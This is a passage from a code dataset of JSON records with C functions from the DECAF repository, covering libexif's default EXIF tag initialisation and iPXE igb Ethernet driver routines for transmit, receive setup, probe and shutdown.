EXIF_TAG_ISO_SPEED_RATINGS:\n\n\t/* SHORT, 1 component, default 0 */\n\tcase EXIF_TAG_IMAGE_WIDTH:\n\tcase EXIF_TAG_IMAGE_LENGTH:\n\tcase EXIF_TAG_EXPOSURE_PROGRAM:\n\tcase EXIF_TAG_LIGHT_SOURCE:\n\tcase EXIF_TAG_METERING_MODE:\n\tcase EXIF_TAG_CUSTOM_RENDERED:\n\tcase EXIF_TAG_SCENE_CAPTURE_TYPE:\n\tcase EXIF_TAG_CONTRAST:\n\tcase EXIF_TAG_SATURATION:\n\tcase EXIF_TAG_SHARPNESS:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_SHORT;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\texif_set_short (e->data, o, 0);\n\t\tbreak;\n\n\t/* SHORT, 1 component, default 1 */\n\tcase EXIF_TAG_ORIENTATION:\n\tcase EXIF_TAG_PLANAR_CONFIGURATION:\n\tcase EXIF_TAG_YCBCR_POSITIONING:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_SHORT;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\texif_set_short (e->data, o, 1);\n\t\tbreak;\n\n\t/* SHORT, 1 component, default 2 */\n\tcase EXIF_TAG_RESOLUTION_UNIT:\n\tcase EXIF_TAG_FOCAL_PLANE_RESOLUTION_UNIT:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_SHORT;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\texif_set_short (e->data, o, 2);\n\t\tbreak;\n\n\t/* SHORT, 1 component, default 3 */\n\tcase EXIF_TAG_SAMPLES_PER_PIXEL:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_SHORT;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\texif_set_short (e->data, o, 3);\n\t\tbreak;\n\n\t/* SHORT, 1 component, default 0xffff */\n\tcase EXIF_TAG_COLOR_SPACE:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_SHORT;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\texif_set_short (e->data, o, 0xffff);\n\t\tbreak;\n\n\t/* SHORT, 3 components, default 8 8 8 */\n\tcase EXIF_TAG_BITS_PER_SAMPLE:\n\t\te->components = 3;\n\t\te->format = EXIF_FORMAT_SHORT;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\texif_set_short (e->data, o, 8);\n\t\texif_set_short (\n\t\t\te->data + exif_format_get_size (e->format),\n\t\t\to, 8);\n\t\texif_set_short (\n\t\t\te->data + 2 * exif_format_get_size (e->format),\n\t\t\to, 8);\n\t\tbreak;\n\n\t/* SHORT, 2 components, default 2 1 */\n\tcase EXIF_TAG_YCBCR_SUB_SAMPLING:\n\t\te->components = 2;\n\t\te->format = EXIF_FORMAT_SHORT;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\texif_set_short (e->data, o, 2);\n\t\texif_set_short (\n\t\t\te->data + exif_format_get_size (e->format),\n\t\t\to, 1);\n\t\tbreak;\n\n\t/* SRATIONAL, 1 component, no default */\n\tcase EXIF_TAG_EXPOSURE_BIAS_VALUE:\n\tcase EXIF_TAG_BRIGHTNESS_VALUE:\n\tcase EXIF_TAG_SHUTTER_SPEED_VALUE:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_SRATIONAL;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\tbreak;\n\n\t/* RATIONAL, 1 component, no default */\n\tcase EXIF_TAG_EXPOSURE_TIME:\n\tcase EXIF_TAG_FOCAL_PLANE_X_RESOLUTION:\n\tcase EXIF_TAG_FOCAL_PLANE_Y_RESOLUTION:\n\tcase EXIF_TAG_EXPOSURE_INDEX:\n\tcase EXIF_TAG_FLASH_ENERGY:\n\tcase EXIF_TAG_FNUMBER:\n\tcase EXIF_TAG_FOCAL_LENGTH:\n\tcase EXIF_TAG_SUBJECT_DISTANCE:\n\tcase EXIF_TAG_MAX_APERTURE_VALUE:\n\tcase EXIF_TAG_APERTURE_VALUE:\n\tcase EXIF_TAG_COMPRESSED_BITS_PER_PIXEL:\n\tcase EXIF_TAG_PRIMARY_CHROMATICITIES:\n\tcase EXIF_TAG_DIGITAL_ZOOM_RATIO:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_RATIONAL;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\tbreak;\n\n\t/* RATIONAL, 1 component, default 72/1 */\n\tcase EXIF_TAG_X_RESOLUTION:\n\tcase EXIF_TAG_Y_RESOLUTION:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_RATIONAL;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\tr.numerator = 72;\n\t\tr.denominator = 1;\n\t\texif_set_rational (e->data, o, r);\n\t\tbreak;\n\n\t/* RATIONAL, 2 components, no default */\n\tcase EXIF_TAG_WHITE_POINT:\n\t\te->components = 2;\n\t\te->format = EXIF_FORMAT_RATIONAL;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\tbreak;\n\n\t/* RATIONAL, 6 components */\n\tcase EXIF_TAG_REFERENCE_BLACK_WHITE:\n\t\te->components = 6;\n\t\te->format = EXIF_FORMAT_RATIONAL;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\tr.denominator = 1;\n\t\tr.numerator = 0;\n\t\texif_set_rational (e->data, o, r);\n\t\tr.numerator = 255;\n\t\texif_set_rational (\n\t\t\te->data + exif_format_get_size (e->format), o, r);\n\t\tr.numerator = 0;\n\t\texif_set_rational (\n\t\t\te->data + 2 * exif_format_get_size (e->format), o, r);\n\t\tr.numerator = 255;\n\t\texif_set_rational (\n\t\t\te->data + 3 * exif_format_get_size (e->format), o, r);\n\t\tr.numerator = 0;\n\t\texif_set_rational (\n\t\t\te->data + 4 * exif_format_get_size (e->format), o, r);\n\t\tr.numerator = 255;\n\t\texif_set_rational (\n\t\t\te->data + 5 * exif_format_get_size (e->format), o, r);\n\t\tbreak;\n\n\t/* ASCII, 20 components */\n\tcase EXIF_TAG_DATE_TIME:\n\tcase EXIF_TAG_DATE_TIME_ORIGINAL:\n\tcase EXIF_TAG_DATE_TIME_DIGITIZED:\n\t{\n\t\ttime_t t;\n#ifdef HAVE_LOCALTIME_R\n\t\tstruct tm tms;\n#endif\n\t\tstruct tm *tm;\n\n\t\tt = time (NULL);\n#ifdef HAVE_LOCALTIME_R\n\t\ttm = localtime_r (&t, &tms);\n#else\n\t\ttm = localtime (&t);\n#endif\n\t\te->components = 20;\n\t\te->format = EXIF_FORMAT_ASCII;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\tsnprintf ((char *) e->data, e->size,\n\t\t\t  \"%04i:%02i:%02i %02i:%02i:%02i\",\n\t\t\t  tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,\n\t\t\t  tm->tm_hour, tm->tm_min, tm->tm_sec);\n\t\tbreak;\n\t}\n\n\t/* ASCII, no default */\n\tcase EXIF_TAG_SUB_SEC_TIME:\n\tcase EXIF_TAG_SUB_SEC_TIME_ORIGINAL:\n\tcase EXIF_TAG_SUB_SEC_TIME_DIGITIZED:\n\t\te->components = 0;\n\t\te->format = EXIF_FORMAT_ASCII;\n\t\te->size = 0;\n\t\te->data = NULL;\n\t\tbreak;\n\n\t/* ASCII, default \"[None]\" */\n\tcase EXIF_TAG_IMAGE_DESCRIPTION:\n\tcase EXIF_TAG_MAKE:\n\tcase EXIF_TAG_MODEL:\n\tcase EXIF_TAG_SOFTWARE:\n\tcase EXIF_TAG_ARTIST:\n\t\te->components = strlen (_(\"[None]\")) + 1;\n\t\te->format = EXIF_FORMAT_ASCII;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\tstrncpy ((char *)e->data, _(\"[None]\"), e->size);\n\t\tbreak;\n\t/* ASCII, default \"[None]\\0[None]\\0\" */\n\tcase EXIF_TAG_COPYRIGHT:\n\t\te->components = (strlen (_(\"[None]\")) + 1) * 2;\n\t\te->format = EXIF_FORMAT_ASCII;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\tstrcpy (((char *)e->data) + 0, _(\"[None]\"));\n\t\tstrcpy (((char *)e->data) + strlen (_(\"[None]\")) + 1, _(\"[None]\"));\n\t\tbreak;\n\n\t/* UNDEFINED, 1 component, default 1 */\n\tcase EXIF_TAG_SCENE_TYPE:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_UNDEFINED;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\te->data[0] = 0x01;\n\t\tbreak;\n\n\t/* UNDEFINED, 1 component, default 3 */\n\tcase EXIF_TAG_FILE_SOURCE:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_UNDEFINED;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\te->data[0] = 0x03;\n\t\tbreak;\n\n\t/* UNDEFINED, 4 components, default 48 49 48 48 */\n        case EXIF_TAG_FLASH_PIX_VERSION:\n                e->components = 4;\n                e->format = EXIF_FORMAT_UNDEFINED;\n                e->size = exif_format_get_size (e->format) * e->components;\n                e->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n                memcpy (e->data, \"0100\", 4);\n                break;\n\n        /* UNDEFINED, 4 components, default 48 50 49 48 */\n        case EXIF_TAG_EXIF_VERSION:\n                e->components = 4;\n                e->format = EXIF_FORMAT_UNDEFINED;\n                e->size = exif_format_get_size (e->format) * e->components;\n                e->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n                memcpy (e->data, \"0210\", 4);\n                break;\n\n        /* UNDEFINED, 4 components, default 1 2 3 0 */\n        case EXIF_TAG_COMPONENTS_CONFIGURATION:\n                e->components = 4;\n                e->format = EXIF_FORMAT_UNDEFINED;\n                e->size = exif_format_get_size (e->format) * e->components;\n                e->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\te->data[0] = 1;\n\t\te->data[1] = 2;\n\t\te->data[2] = 3;\n\t\te->data[3] = 0;\n                break;\n\n\t/* UNDEFINED, no components, no default */\n\t/* Use this if the tag is otherwise unsupported */\n\tcase EXIF_TAG_MAKER_NOTE:\n\tcase EXIF_TAG_USER_COMMENT:\n\tdefault:\n\t\te->components = 0;\n\t\te->format = EXIF_FORMAT_UNDEFINED;\n\t\te->size = 0;\n\t\te->data = NULL;\n\t\tbreak;\n\t}\n}", "path": "DECAF/decaf/shared/sleuthkit/framework/modules/c_LibExifModule/libexif-0.6.20/libexif/exif-entry.c", "commit_date": "2015-06-19 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_process_tx_packets - process transmitted packets\n *\n * @v netdev\tnetwork interface device structure\n **/\n", "func_signal": "static void igb_process_tx_packets ( struct net_device *netdev )", "code": "{\n\tstruct igb_adapter *adapter = netdev_priv ( netdev );\n\tuint32_t i;\n\tuint32_t tx_status;\n\tstruct e1000_tx_desc *tx_curr_desc;\n\n\t/* Check status of transmitted packets\n\t */\n\tDBG ( \"process_tx_packets: tx_head = %d, tx_tail = %d\\n\", adapter->tx_head,\n\t      adapter->tx_tail );\n\n\twhile ( ( i = adapter->tx_head ) != adapter->tx_tail ) {\n\n\t\ttx_curr_desc = ( void * )  ( adapter->tx_base ) +\n\t\t\t\t\t   ( i * sizeof ( *adapter->tx_base ) );\n\n\t\ttx_status = tx_curr_desc->upper.data;\n\n\t\tDBG ( \"\t tx_curr_desc = %#08lx\\n\", virt_to_bus ( tx_curr_desc ) );\n\t\tDBG ( \"\t tx_status = %#08x\\n\", tx_status );\n\n\t\t/* if the packet at tx_head is not owned by hardware it is for us */\n\t\tif ( ! ( tx_status & E1000_TXD_STAT_DD ) )\n\t\t\tbreak;\n\n\t\tDBG ( \"Sent packet. tx_head: %d tx_tail: %d tx_status: %#08x\\n\",\n\t\t      adapter->tx_head, adapter->tx_tail, tx_status );\n\n\t\tif ( tx_status & ( E1000_TXD_STAT_EC | E1000_TXD_STAT_LC |\n\t\t\t\t   E1000_TXD_STAT_TU ) ) {\n\t\t\tnetdev_tx_complete_err ( netdev, adapter->tx_iobuf[i], -EINVAL );\n\t\t\tDBG ( \"Error transmitting packet, tx_status: %#08x\\n\",\n\t\t\t      tx_status );\n\t\t} else {\n\t\t\tnetdev_tx_complete ( netdev, adapter->tx_iobuf[i] );\n\t\t\tDBG ( \"Success transmitting packet, tx_status: %#08x\\n\",\n\t\t\t      tx_status );\n\t\t}\n\n\t\t/* Decrement count of used descriptors, clear this descriptor\n\t\t */\n\t\tadapter->tx_fill_ctr--;\n\t\tmemset ( tx_curr_desc, 0, sizeof ( *tx_curr_desc ) );\n\n\t\tadapter->tx_head = ( adapter->tx_head + 1 ) % NUM_TX_DESC;\n\t}\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_configure_rx - Configure 8254x Receive Unit after Reset\n * @adapter: board private structure\n *\n * Configure the Rx unit of the MAC after a reset.\n **/\n", "func_signal": "static void igb_configure_rx ( struct igb_adapter *adapter )", "code": "{\n\tstruct e1000_hw *hw = &adapter->hw;\n\tuint32_t rctl, rxdctl, rxcsum, mrqc;\n\n\tDBGP ( \"igb_configure_rx\\n\" );\n\n\t/* disable receives while setting up the descriptors */\n\trctl = E1000_READ_REG ( hw, E1000_RCTL );\n\tE1000_WRITE_REG ( hw, E1000_RCTL, rctl & ~E1000_RCTL_EN );\n\tE1000_WRITE_FLUSH(hw);\n\tmdelay(10);\n\n\tadapter->rx_curr = 0;\n\n\t/* Setup the HW Rx Head and Tail Descriptor Pointers and\n\t * the Base and Length of the Rx Descriptor Ring */\n\n\tE1000_WRITE_REG ( hw, E1000_RDBAL(0), virt_to_bus ( adapter->rx_base ) );\n\tE1000_WRITE_REG ( hw, E1000_RDBAH(0), 0 );\n\tE1000_WRITE_REG ( hw, E1000_RDLEN(0), adapter->rx_ring_size );\n\n\tE1000_WRITE_REG ( hw, E1000_RDH(0), 0 );\n\tE1000_WRITE_REG ( hw, E1000_RDT(0), 0 );\n\n\tDBG ( \"E1000_RDBAL(0): %#08x\\n\",  E1000_READ_REG ( hw, E1000_RDBAL(0) ) );\n\tDBG ( \"E1000_RDLEN(0): %d\\n\",\t  E1000_READ_REG ( hw, E1000_RDLEN(0) ) );\n\tDBG ( \"E1000_RCTL:  %#08x\\n\",\t  E1000_READ_REG ( hw, E1000_RCTL ) );\n\n\trxdctl = E1000_READ_REG ( hw, E1000_RXDCTL(0) );\n\trxdctl |= E1000_RXDCTL_QUEUE_ENABLE;\n\trxdctl &= 0xFFF00000;\n\trxdctl |= IGB_RX_PTHRESH;\n\trxdctl |= IGB_RX_HTHRESH << 8;\n\trxdctl |= IGB_RX_WTHRESH << 16;\n\tE1000_WRITE_REG ( hw, E1000_RXDCTL(0), rxdctl );\n\tE1000_WRITE_FLUSH ( hw );\n\n\trxcsum = E1000_READ_REG(hw, E1000_RXCSUM);\n\trxcsum &= ~( E1000_RXCSUM_TUOFL | E1000_RXCSUM_IPPCSE );\n\tE1000_WRITE_REG ( hw, E1000_RXCSUM, 0 );\n\n\t/* The initial value for MRQC disables multiple receive\n\t * queues, however this setting is not recommended.\n\t * - Intel\u00ae 82576 Gigabit Ethernet Controller Datasheet r2.41\n\t *   Section 8.10.9 Multiple Queues Command Register - MRQC\n\t */\n\tmrqc = E1000_MRQC_ENABLE_VMDQ;\n\tE1000_WRITE_REG ( hw, E1000_MRQC, mrqc );\n\n\t/* Turn off loopback modes */\n\trctl &= ~(E1000_RCTL_LBM_TCVR | E1000_RCTL_LBM_MAC);\n\n\t/* set maximum packet size */\n\trctl |=\t E1000_RCTL_SZ_2048;\n\n\t/* Broadcast enable, multicast promisc, unicast promisc */\n\trctl |=\t E1000_RCTL_BAM | E1000_RCTL_MPE | E1000_RCTL_UPE;\n\n\t/* Store bad packets */\n\trctl |=\t E1000_RCTL_SBP;\n\n\t/* enable LPE to prevent packets larger than max_frame_size */\n\trctl |= E1000_RCTL_LPE;\n\n\t/* enable stripping of CRC. */\n\trctl |= E1000_RCTL_SECRC;\n\n\t/* enable receive control register */\n\trctl |= E1000_RCTL_EN;\n\tE1000_WRITE_REG(hw, E1000_RCTL, rctl);\n\tE1000_WRITE_FLUSH(hw);\n\n\t/* On the 82576, RDT([0]) must not be \"bumped\" before\n\t * the enable bit of RXDCTL([0]) is set.\n\t * - Intel\u00ae 82576 Gigabit Ethernet Controller Datasheet r2.41\n\t *   Section 4.5.9 receive Initialization\n\t *\n\t * By observation I have found this to occur when the enable bit of\n\t * RCTL is set. The datasheet recommends polling for this bit,\n\t * however as I see no evidence of this in the Linux igb driver\n\t * I have omitted that step.\n\t * - Simon Horman, May 2009\n\t */\n\tE1000_WRITE_REG ( hw, E1000_RDT(0), NUM_RX_DESC - 1 );\n\n\tDBG ( \"RDBAH: %#08x\\n\",\t E1000_READ_REG ( hw, E1000_RDBAH(0) ) );\n\tDBG ( \"RDBAL: %#08x\\n\",\t E1000_READ_REG ( hw, E1000_RDBAL(0) ) );\n\tDBG ( \"RDLEN: %d\\n\",\t E1000_READ_REG ( hw, E1000_RDLEN(0) ) );\n\tDBG ( \"RCTL:  %#08x\\n\",\t E1000_READ_REG ( hw, E1000_RCTL ) );\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_setup_rx_resources - allocate Rx resources (Descriptors)\n *\n * @v adapter\te1000 private structure\n *\n * @ret rc\t Returns 0 on success, negative on failure\n **/\n", "func_signal": "static int igb_setup_rx_resources ( struct igb_adapter *adapter )", "code": "{\n\tint i, rc = 0;\n\n\tDBGP ( \"igb_setup_rx_resources\\n\" );\n\n\t/* Allocate receive descriptor ring memory.\n\t   It must not cross a 64K boundary because of hardware errata\n\t */\n\n\tadapter->rx_base =\n\t\tmalloc_dma ( adapter->rx_ring_size, adapter->rx_ring_size );\n\n\tif ( ! adapter->rx_base ) {\n\t\treturn -ENOMEM;\n\t}\n\tmemset ( adapter->rx_base, 0, adapter->rx_ring_size );\n\n\tfor ( i = 0; i < NUM_RX_DESC; i++ ) {\n\t\t/* let igb_refill_rx_ring() io_buffer allocations */\n\t\tadapter->rx_iobuf[i] = NULL;\n\t}\n\n\t/* allocate io_buffers */\n\trc = igb_refill_rx_ring ( adapter );\n\tif ( rc < 0 )\n\t\tigb_free_rx_resources ( adapter );\n\n\treturn rc;\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_probe - Initial configuration of NIC\n *\n * @v pci\tPCI device\n * @v id\tPCI IDs\n *\n * @ret rc\tReturn status code\n **/\n", "func_signal": "int igb_probe ( struct pci_device *pdev )", "code": "{\n\tint i, err;\n\tstruct net_device *netdev;\n\tstruct igb_adapter *adapter;\n\tunsigned long mmio_start, mmio_len;\n\tstruct e1000_hw *hw;\n\n\tDBGP ( \"igb_probe\\n\" );\n\n\terr = -ENOMEM;\n\n\t/* Allocate net device ( also allocates memory for netdev->priv\n\t   and makes netdev-priv point to it ) */\n\tnetdev = alloc_etherdev ( sizeof ( struct igb_adapter ) );\n\tif ( ! netdev ) {\n\t\tDBG ( \"err_alloc_etherdev\\n\" );\n\t\tgoto err_alloc_etherdev;\n\t}\n\n\t/* Associate igb-specific network operations operations with\n\t * generic network device layer */\n\tnetdev_init ( netdev, &igb_operations );\n\n\t/* Associate this network device with given PCI device */\n\tpci_set_drvdata ( pdev, netdev );\n\tnetdev->dev = &pdev->dev;\n\n\t/* Initialize driver private storage */\n\tadapter = netdev_priv ( netdev );\n\tmemset ( adapter, 0, ( sizeof ( *adapter ) ) );\n\n\tadapter->pdev\t    = pdev;\n\n\tadapter->ioaddr\t    = pdev->ioaddr;\n\tadapter->hw.io_base = pdev->ioaddr;\n\n\thw\t\t    = &adapter->hw;\n\thw->vendor_id\t    = pdev->vendor;\n\thw->device_id\t    = pdev->device;\n\n\tadapter->irqno\t    = pdev->irq;\n\tadapter->netdev\t    = netdev;\n\tadapter->hw.back    = adapter;\n\n\tadapter->min_frame_size\t   = ETH_ZLEN + ETH_FCS_LEN;\n\tadapter->max_hw_frame_size = ETH_FRAME_LEN + ETH_FCS_LEN;\n\n\tadapter->tx_ring_size = sizeof ( *adapter->tx_base ) * NUM_TX_DESC;\n\tadapter->rx_ring_size = sizeof ( *adapter->rx_base ) * NUM_RX_DESC;\n\n\t/* Fix up PCI device */\n\tadjust_pci_device ( pdev );\n\n\terr = -EIO;\n\n\tmmio_start = pci_bar_start ( pdev, PCI_BASE_ADDRESS_0 );\n\tmmio_len   = pci_bar_size  ( pdev, PCI_BASE_ADDRESS_0 );\n\n\tDBG ( \"mmio_start: %#08lx\\n\", mmio_start );\n\tDBG ( \"mmio_len: %#08lx\\n\", mmio_len );\n\n\tadapter->hw.hw_addr = ioremap ( mmio_start, mmio_len );\n\tDBG ( \"adapter->hw.hw_addr: %p\\n\", adapter->hw.hw_addr );\n\n\tif ( ! adapter->hw.hw_addr ) {\n\t\tDBG ( \"err_ioremap\\n\" );\n\t\tgoto err_ioremap;\n\t}\n\n\t/* setup adapter struct */\n\terr = igb_sw_init ( adapter );\n\tif (err) {\n\t\tDBG ( \"err_sw_init\\n\" );\n\t\tgoto err_sw_init;\n\t}\n\n\tigb_get_bus_info(hw);\n\n\t/* Copper options */\n\tif (adapter->hw.phy.media_type == e1000_media_type_copper) {\n\t\tadapter->hw.phy.mdix = AUTO_ALL_MODES;\n\t\tadapter->hw.phy.disable_polarity_correction = 0;\n\t\tadapter->hw.phy.ms_type = e1000_ms_hw_default;\n\t}\n\n\tDBG ( \"adapter->hw.mac.type: %#08x\\n\", adapter->hw.mac.type );\n\n\t/* Force auto-negotiation */\n\tadapter->hw.mac.autoneg = 1;\n\tadapter->fc_autoneg = 1;\n\tadapter->hw.phy.autoneg_wait_to_complete = true;\n\tadapter->hw.mac.adaptive_ifs = true;\n\tadapter->hw.fc.requested_mode = e1000_fc_default;\n\tadapter->hw.fc.current_mode = e1000_fc_default;\n\n\tigb_validate_mdi_setting(hw);\n\n\t/*\n\t * before reading the NVM, reset the controller to\n\t * put the device in a known good starting state\n\t */\n\tigb_reset_hw(hw);\n\n\t/*\n\t * systems with ASPM and others may see the checksum fail on the first\n\t * attempt. Let's give it a few tries\n\t */\n\tfor (i = 0;; i++) {\n\t\tif (igb_validate_nvm_checksum(&adapter->hw) >= 0)\n\t\t\tbreak;\n\t\tif (i == 2) {\n\t\t\terr = -EIO;\n\t\t\tDBG ( \"The NVM Checksum Is Not Valid\\n\" );\n\t\t\tDBG ( \"err_eeprom\\n\" );\n\t\t\tgoto err_eeprom;\n\t\t}\n\t}\n\n\t/* copy the MAC address out of the EEPROM */\n\tif ( igb_read_mac_addr ( &adapter->hw ) ) {\n\t\tDBG ( \"EEPROM Read Error\\n\" );\n\t}\n\n\tmemcpy ( netdev->hw_addr, adapter->hw.mac.perm_addr, ETH_ALEN );\n\n\t/* reset the hardware with the new settings */\n\tigb_reset ( adapter );\n\n\t/* let the f/w know that the h/w is now under the control of the\n\t * driver. */\n\tigb_get_hw_control(adapter);\n\n\tif ( ( err = register_netdev ( netdev ) ) != 0) {\n\t\tDBG ( \"err_register\\n\" );\n\t\tgoto err_register;\n\t}\n\n\t/* Mark as link up; we don't yet handle link state */\n\tnetdev_link_up ( netdev );\n\n\tfor (i = 0; i < 6; i++) {\n\t\tDBG (\"%02x%s\", netdev->ll_addr[i], i == 5 ? \"\\n\" : \":\");\n        }\n\n\tDBG ( \"igb_probe succeeded!\\n\" );\n\n\t/* No errors, return success */\n\treturn 0;\n\n/* Error return paths */\nerr_register:\nerr_eeprom:\nerr_sw_init:\n\tiounmap ( adapter->hw.hw_addr );\nerr_ioremap:\n\tnetdev_put ( netdev );\nerr_alloc_etherdev:\n\treturn err;\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_read_pcie_cap_reg - retrieve PCIe capability register contents\n * @hw: address of board private structure\n * @reg: PCIe capability register requested\n * @value: where to store requested value\n **/\n", "func_signal": "int32_t igb_read_pcie_cap_reg(struct e1000_hw *hw, uint32_t reg, uint16_t *value)", "code": "{\n    struct igb_adapter *adapter = hw->back;\n    uint16_t cap_offset;\n\n#define\t PCI_CAP_ID_EXP\t       0x10    /* PCI Express */\n    cap_offset = pci_find_capability(adapter->pdev, PCI_CAP_ID_EXP);\n    if (!cap_offset)\n\treturn -E1000_ERR_CONFIG;\n\n    pci_read_config_word(adapter->pdev, cap_offset + reg, value);\n\n    return E1000_SUCCESS;\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_close - Disables a network interface\n *\n * @v netdev\tnetwork interface device structure\n *\n **/\n", "func_signal": "static void igb_close ( struct net_device *netdev )", "code": "{\n\tstruct igb_adapter *adapter = netdev_priv ( netdev );\n\tstruct e1000_hw *hw = &adapter->hw;\n\tuint32_t rctl;\n\n\tDBGP ( \"igb_close\\n\" );\n\n\t/* Disable and acknowledge interrupts */\n\tigb_irq_disable ( adapter );\n\tE1000_READ_REG ( hw, E1000_ICR );\n\n\t/* disable receives */\n\trctl = E1000_READ_REG ( hw, E1000_RCTL );\n\tE1000_WRITE_REG ( hw, E1000_RCTL, rctl & ~E1000_RCTL_EN );\n\tE1000_WRITE_FLUSH(hw);\n\n\tigb_reset ( adapter );\n\n\tigb_free_tx_resources ( adapter );\n\tigb_free_rx_resources ( adapter );\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_irq_disable - Mask off interrupt generation on the NIC\n * @adapter: board private structure\n **/\n", "func_signal": "static void igb_irq_disable(struct igb_adapter *adapter)", "code": "{\n\tstruct e1000_hw *hw = &adapter->hw;\n\n\tE1000_WRITE_REG(hw, E1000_IAM, 0);\n\tE1000_WRITE_REG(hw, E1000_IMC, ~0);\n\tE1000_WRITE_FLUSH(hw);\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_get_hw_control - get control of the h/w from f/w\n * @adapter: address of board private structure\n *\n * igb_get_hw_control sets CTRL_EXT:DRV_LOAD bit.\n * For ASF and Pass Through versions of f/w this means that\n * the driver is loaded.\n *\n **/\n", "func_signal": "void igb_get_hw_control(struct igb_adapter *adapter)", "code": "{\n\tstruct e1000_hw *hw = &adapter->hw;\n\tu32 ctrl_ext;\n\n\t/* Let firmware know the driver has taken over */\n\tctrl_ext = E1000_READ_REG(hw, E1000_CTRL_EXT);\n\tE1000_WRITE_REG(hw, E1000_CTRL_EXT,\n\t\t\tctrl_ext | E1000_CTRL_EXT_DRV_LOAD);\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
